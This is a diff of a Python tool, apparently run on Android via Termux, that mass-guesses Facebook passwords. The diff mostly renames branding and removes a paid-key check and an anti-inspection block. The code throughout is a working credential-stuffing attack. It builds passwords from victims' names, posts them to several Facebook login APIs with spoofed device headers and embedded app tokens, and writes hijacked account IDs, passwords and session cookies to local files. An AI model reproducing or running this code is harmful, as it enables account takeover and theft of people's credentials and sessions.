@@ -1,4 +1,4 @@
-# ASSALAMUALAIKUM 
+# JAISHREERAM 
 #OPEN SOURCE BY OWNER RUDRA SINGH
 #EDIT BY_______________RUDRA SINGH
 # READ KR LO PHLE YE SB
@@ -34,37 +34,12 @@ except ModuleNotFoundError:
 
 
 #____________UA-SETUP_______#
-def RUDRA_SINGH():
-    ua = '[FBAN/EMA;FBLC/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/EMA;FBLC/en_US;FBAV/461.0.0.15.118;FBCX/modulariab;FBDM/{density=3.0,width=1080,height=2165};FBLC/it_IT;FBRV/526139383;FBCR/TIM;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/A0001;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
+def RUDRA():
+    ua = '[FBAN/EMA;FBLC/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
     return ua
-#__________END_________#
 
 
-#============Capture Protection============#
-first='/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/'
-if not 'print' in open(first+'api.py','r').read():
-    pass
-else:
-    exit('\33[1;91mWARNING ⚠️')
-if not 'print' in open(first+'sessions.py','r').read():
-    pass
-else:
-    exit('\33[1;91mWARNING ⚠️')    
-
-first='/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/'
-if not 'print' in open(first+'api.py','r').read():
-    pass
-else:
-    exit('\33[1;91mWARNING ⚠️')
-if not 'print' in open(first+'sessions.py','r').read():
-    pass
-else:
-    exit('\33[1;91mWARNING ⚠️')
 #============END============#
-
-
-
-
 
 
 ugen1=[]
@@ -131,22 +106,23 @@ def clear():
     print(logo)
 logo =                                          ("""   
 
-__________ ____ ___________ __________    _____   
+\033[1;32m 
+
+   __________ ____ ___________ __________    _____   
 \______   \    |   \______ \\______   \  /  _  \  
  |       _/    |   /|    |  \|       _/ /  /_\  \ 
  |    |   \    |  / |    `   \    |   \/    |    \
  |____|_  /______/ /_______  /____|_  /\____|__  /
         \/                 \/       \/         \/ 
-                             
-                               
-                          \033[1;37m\033[1;42m RUDRA : RUDRA SINGH \033[0m\033[1;37m
-\033[1;37;1m -----------------------------------------------
-\033[1;97m[>] AUTHOR       : RUDRA SINGH
-\033[1;97m[>] FACEBOOK     : Rudra Singh
-\033[1;97m[>] VERSION      : 8.8
-\033[1;97m[>] STATUS       : \x1b[38;5;46mPAID
-\033[1;97m[>] NETWORK      : 3G/4G/WIFI
-\033[1;37;1m-----------------------------------------------""" )
+ \033[1;37m--------------------------------------------------
+ \033[1;37m[•] AUTHOR     : \033[1;32mRUDRA SINGH\033[1;37m
+ \033[1;37m[•] GITHUB     : \033[1;32mrudra430\033[1;37m
+ \033[1;37m[•] TOOL NAME  : \033[1;32mRUDRA\033[1;37m
+ \033[1;37m[•] TOOL TYPE  : \033[1;32mRANDOM\033[1;37m
+ \033[1;37m[•] STATUS     : \033[1;32mPAID\033[1;37m
+ \033[1;37m--------------------------------------------------
+ \033[1;37m[•] \033[1;37mVERSION    :\033[1;32m 1.0 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
+ \033[1;37m--------------------------------------------------""")
 def line():
     print(f'\033[1;37m-----------------------------------------------')
 
@@ -165,42 +141,7 @@ import subprocess
 import time
 from io import BytesIO
 
-def key():
-    clear()
-    key = "MR-RudraA{RUDRA}|•|✓" + str(os.geteuid()) + str(os.getlogin()).replace('u0_a', '')
-    print(f" \033[1;32m TOOL IS PAID YOU NEED APPROVAL ")
-    print(f" \033[1;32m Your Login Key is  : " + key)
-    buffer = BytesIO()
-    curl = pycurl.Curl()
-    curl.setopt(curl.URL, "https://github.com/rudra430/RUDRA-BACK")
-    curl.setopt(curl.WRITEDATA, buffer)
-    curl.perform()
-    curl.close()
-    don = buffer.getvalue().decode('utf-8')
-    if key in don:
-        print(f"\033[1;32mTOOL LOGIN SUCCESSFULLY")
-        menu()
-    else:
-        print(f"\033[1;32m YOUR KEY NOT APPROVED CONTACT ADMIN")
-        print(f"\033[1;32m 3 DAY APPROVE RS 150")
-        print(f"\033[1;32m 6 DAY APPROVE RS 300")
-        print(" \33[37;44m\t WELCOME TO RUDRA TOOL AND ENJOY \33[0;m")
-        print('\33[1;37m====================================================')     
-        # linex()
-        print(f"\033[1;32m [A] CONTACT WITH ME ON WHATSAPP")
-        print(f"\033[1;32m [B] CONTACT WITH ME ON FACEBOOK")
-        # linex()
-        adi = input(f" \033[1;32m[•] CHOICE : ")
-        if adi in ['A', 'a', '01', '1']:
-            nm = input(f"\033[1;32m ENTER YOUR NAME : ")
-            wp = input(f"\033[1;32m ENTER YOUR WHATSAPP NUMBER :")
-            url_wa = "https://api.whatsapp.com/send?phone=++919125065988&text="
-            tk = (f'Hello%20Sir%20!%20Please%20Approve%20My%20Tool%20Login%20Key%20:%20My%20Name%20is%20'
-                  + nm + '%20and%20whatsapp%20number%20is%20%20:' + wp + '%20Here%20my%20key%20' + key)
-            subprocess.check_output(["am", "start", url_wa + tk])
-            time.sleep(2)
-        else:
-            os.system('xdg-open https://www.facebook.com/rudra.singh.237097')
+
 #____________________________________________________________END_____________________________________________#      
             
 #_________Year checker_________#
@@ -550,7 +491,7 @@ def gmail():
 
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mRUDRA_SINGH\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mRUDRA\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -562,8 +503,8 @@ def ffb(ids,names,passlist):
                 ps2 = last.lower()
                 for fikr in passlist:
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-                        ua=random.choice(RUDRA_SINGH())
-                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':RUDRA_SINGH(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        ua=random.choice(RUDRA())
+                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':RUDRA(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                         getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
@@ -571,15 +512,15 @@ def ffb(ids,names,passlist):
                         if "c_user" in Aws:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\033[96;1 [RUDRA_SINGH-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/RUDRA_SINGH-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RUDRA_SINGH-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
+                                print('\033[96;1 [RUDRA-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/RUDRA-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RUDRA-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                               
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Aws:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[38;5;208m [RUDRA_SINGH-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/RUDRA_SINGH-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;208m [RUDRA-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/RUDRA-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -592,7 +533,7 @@ def ffb(ids,names,passlist):
 def api1(ids,names,passlist):
     try:
         global ok,loop,sim_id
-        sys.stdout.write('\r\r\033[1;37m [\x1b[1;97mRUDRA_SINGH\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()  
+        sys.stdout.write('\r\r\033[1;37m [\x1b[1;97mRUDRA\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()  
         fn = names.split(' ')[0]
         try:
             ln = names.split(' ')[1]
@@ -601,7 +542,7 @@ def api1(ids,names,passlist):
         for pw in passlist:
             pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
             head = {
-    'User-Agent': RUDRA_SINGH(),
+    'User-Agent': RUDRA(),
     'Accept-Encoding': 'gzip, deflate',
     'Connection': 'close',
     'Content-Type': 'application/x-www-form-urlencoded',
@@ -647,18 +588,18 @@ def api1(ids,names,passlist):
             po = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
             if 'session_key' in po:
                 uid = str(po['uid'])
-                print('\r\r\033[1;32m [RUDRA_SINGH-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
+                print('\r\r\033[1;32m [RUDRA-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                 ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 cookies = f"sb={ssbb};{ckkk}"
                 print('\033[1;32m [🍪] COOKIES :- \033[1;92m'+cookies)                
-                open('/sdcard/RUDRA_SINGH-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
+                open('/sdcard/RUDRA-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in po['error']['message']:
                 uid = str(po['error']['error_data']['uid'])
-                print(f'\r\r\033[1;93m [RUDRA_SINGH-CP] '+uid+' | '+pas+'\033[1;91m')
-                open('/sdcard/RUDRA_SINGH-CP.txt','a').write(uid+'|'+pas+'\n')
+                print(f'\r\r\033[1;93m [RUDRA-OK] '+uid+' | '+pas+'\033[1;91m')
+                open('/sdcard/RUDRA-OK.txt','a').write(uid+'|'+pas+'\n')
                 cps.append(uid)
                 break
             else:
@@ -672,11 +613,11 @@ def rd(ids,passlist):
     try:
         global oks,loop
                 
-        sys.stdout.write('\r\r\033[1;37m [\x1b[1;97mRUDRA_SINGH\x1b[1;92m-\x1b[1;92m🥰\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()      
+        sys.stdout.write('\r\r\033[1;37m [\x1b[1;97mRUDRA\x1b[1;92m-\x1b[1;92m🥰\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()      
         for pas in passlist:                                          
             access_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
             head = {
-    'User-Agent': RUDRA_SINGH(),  
+    'User-Agent': RUDRA(),  
     'Accept-Encoding': 'gzip, deflate',
     'Connection': 'close',
     'Content-Type': 'application/x-www-form-urlencoded',
@@ -723,20 +664,20 @@ def rd(ids,passlist):
             po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head).json()
             if 'session_key' in po:
                 uid = str(po['uid'])                                
-                print('\r\r\033[1;32m [RUDRA_SINGH-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                 
+                print('\r\r\033[1;32m [RUDRA-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                 
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                 ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 cookies = f"sb={ssbb};{ckkk}"
                 print('\033[1;32m [🍪] COOKIES :-\033[1;92m '+cookies)
                                                                                                                           
-                open('/sdcard/RUDRA_SINGH-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
+                open('/sdcard/RUDRA-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
                 oks.append(uid)
                                 
                 break
             elif 'www.facebook.com' in po['error']['message']:                                
                 uid = str(po['error']['error_data']['uid'])
-                print(f'\r\r\033[1;93m [RUDRA_SINGH-CP] '+uid+' | '+pas+'\033[1;91m')
-                open('/sdcard/RUDRA_SINGH-R-CP.txt','a').write(uid+'|'+pas+'\n')
+                print(f'\r\r\033[1;93m [RUDRA-OK] '+uid+' | '+pas+'\033[1;91m')
+                open('/sdcard/RUDRA-R-CP.txt','a').write(uid+'|'+pas+'\n')
                 cps.append(uid)
                 break
             else:
@@ -753,9 +694,9 @@ def bd1(ids,passlist):
     try:
         for ps in passlist:            
             session = requests.Session()
-            sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mRUDRA_SINGH\x1b[1;92m-\x1b[1;92m🥰\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()              
-            pro = random.choice(RUDRA_SINGH())            
-            free_fb = session.get('https://p.facebook.com').text
+            sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mRUDRA\x1b[1;92m-\x1b[1;92m🥰\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()              
+            pro = random.choice(RUDRA())            
+            free_fb = session.get('https://x.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -766,26 +707,26 @@ def bd1(ids,passlist):
             "email":ids,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": RUDRA_SINGH(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
+            header_freefb = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": RUDRA(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m [RUDRA_SINGH-OK] '+ids+' | '+ps)                
+                print('\r\r\033[1;32m [RUDRA-OK] '+ids+' | '+ps)                
                 print('\033[1;32m [🍪] COOKIES :-\033[1;92m '+coki)                
-                open('/sdcard/RUDRA_SINGH-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
+                open('/sdcard/RUDRA-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print(f'\r\r\033[1;93m [RUDRA_SINGH-CP] '+ids+' | '+ps+'\033[1;91m')
-                open('/sdcard/RUDRA_SINGH-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
+                print(f'\r\r\033[1;93m [RUDRA-OK] '+ids+' | '+ps+'\033[1;91m')
+                open('/sdcard/RUDRA-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
                 cps.append(cid)
             elif twf in session.cookies.get_dict().keys():
-                print('\033[1;93m\033[0;34mRUDRA_SINGH-2F '+ids+' • '+ps+'  \033[0;97m')
+                print('\033[1;93m\033[0;34mRUDRA-2F'+ids+' • '+ps+'  \033[0;97m')
                 break
             else:
                 continue
@@ -800,7 +741,7 @@ def bd1(ids,passlist):
 def newidx(ids,names,passlist):
     try:
         global ok,loop,sim_id
-        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mRUDRA_SINGH\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()  
+        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mRUDRA\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()  
         fn = names.split(' ')[0]
         try:
             ln = names.split(' ')[1]
@@ -808,23 +749,23 @@ def newidx(ids,names,passlist):
             ln = fn
         for pw in passlist:
             pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-            head = {"User-Agent": RUDRA_SINGH(),"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),"X-FB-Connection-Type": "MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
+            head = {"User-Agent": RUDRA(),"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),"X-FB-Connection-Type": "MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
             data =  {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "register_api","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "NO_FILE","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "es_PK","client_country_code": "PK","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
             po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
             if 'session_key' in po:
                 uid = str(po['uid'])
-                print('\r\r\033[1;32m [RUDRA_SINGH-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
+                print('\r\r\033[1;32m [RUDRA-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                 ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 cookies = f"sb={ssbb};{ckkk}"
                 print('\033[1;92m [🍪] COOKIES :-\033[1;92m '+cookies)
-                open('/sdcard/RUDRA_SINGH-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
+                open('/sdcard/RUDRA-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in po['error']['message']:
                 uid = str(po['error']['error_data']['uid'])
-                print(f'\r\r\033[1;93m [RUDRA_SINGH-CP] '+uid+' | '+pas+'\033[1;91m')
-                open('/sdcard/RUDRA_SINGH-CP.txt','a').write(uid+'|'+pas+'\n')
+                print(f'\r\r\033[1;93m [RUDRA-OK] '+uid+' | '+pas+'\033[1;91m')
+                open('/sdcard/RUDRA-OK.txt','a').write(uid+'|'+pas+'\n')
                 cps.append(uid)
                 break
             else:
